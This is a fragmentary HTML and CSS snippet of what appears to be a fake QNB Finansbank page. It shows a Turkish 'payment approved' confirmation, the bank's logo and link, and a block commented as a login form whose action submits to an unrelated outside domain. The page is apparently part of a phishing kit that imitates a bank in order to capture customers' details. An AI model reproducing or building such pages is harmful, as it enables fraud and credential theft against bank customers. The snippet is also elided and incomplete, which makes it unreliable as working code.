...
<BR><BR>
    ...
    <div class="fadeIn first">
      <img src="../Common/Styles/images/tebrikler.gif" id="icon" width="1" alt="User Icon" />
      <BR><BR>
    </div>

    <!-- Login Form -->
    <form action="https://ayyildiztim.org">
      <h2 class="active"> ÖDEME İŞLEMİ ONAYLANDI</h2>
    ...
    <div id="formFooter">
      <a href="https://www.qnbfinansbank.com/">
        <img src="../Common/Styles/images/finansbank.png" width="100">
      </a>
    </div>
...
h2.active {
  color: #0d0d0d;
  border-bottom: 2px solid #77024E;
}
